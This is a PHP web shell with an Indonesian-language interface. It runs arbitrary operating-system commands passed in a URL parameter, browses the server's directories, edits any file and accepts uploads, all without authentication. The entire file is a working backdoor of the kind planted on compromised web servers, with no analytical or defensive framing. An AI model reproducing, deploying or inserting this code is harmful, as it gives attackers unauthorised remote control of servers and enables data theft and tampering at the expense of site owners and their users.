<?php
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!is_dir($path)) $path = getcwd();

if (isset($_GET['cmd'])) {
    $output = function_exists('shell_exec') ? shell_exec($_GET['cmd'] . ' 2>&1') : 'shell_exec tidak tersedia.';
    echo "<pre>$output</pre><a href='?path=" . urlencode($path) . "'>Kembali</a>";
    exit;
}

if (isset($_GET['edit'])) {
    $file = $path . DIRECTORY_SEPARATOR . basename($_GET['edit']);
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        file_put_contents($file, $_POST['content']);
        echo "Berhasil disimpan.<br><a href='?path=" . urlencode($path) . "'>Kembali</a>";
        exit;
    }
    $content = htmlspecialchars(file_get_contents($file));
    echo "<form method='post'>
    <textarea name='content' style='width:100%;height:300px;'>$content</textarea><br>
    <button type='submit'>Simpan</button>
    </form>";
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
    $file = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $file);
    echo "Upload selesai.<br><a href='?path=" . urlencode($path) . "'>Kembali</a>";
    exit;
}

echo "<h3>📁 Path: $path</h3>";
echo "<form method='get'><input type='text' name='cmd' placeholder='Perintah shell'><input type='hidden' name='path' value='$path'><button>Jalankan</button></form>";
echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <button>Upload</button>
</form>";
echo "<ul>";

$files = scandir($path);
foreach ($files as $f) {
    if ($f === '.') continue;
    $full = $path . DIRECTORY_SEPARATOR . $f;
    $link = "?path=" . urlencode(realpath($full));
    if (is_dir($full)) {
        echo "<li><a href='$link'>[DIR] $f</a></li>";
    } else {
        echo "<li>$f - <a href='?edit=" . urlencode($f) . "&path=" . urlencode($path) . "'>Edit</a> - <a href='$link'>Buka</a></li>";
    }
}
echo "</ul>";
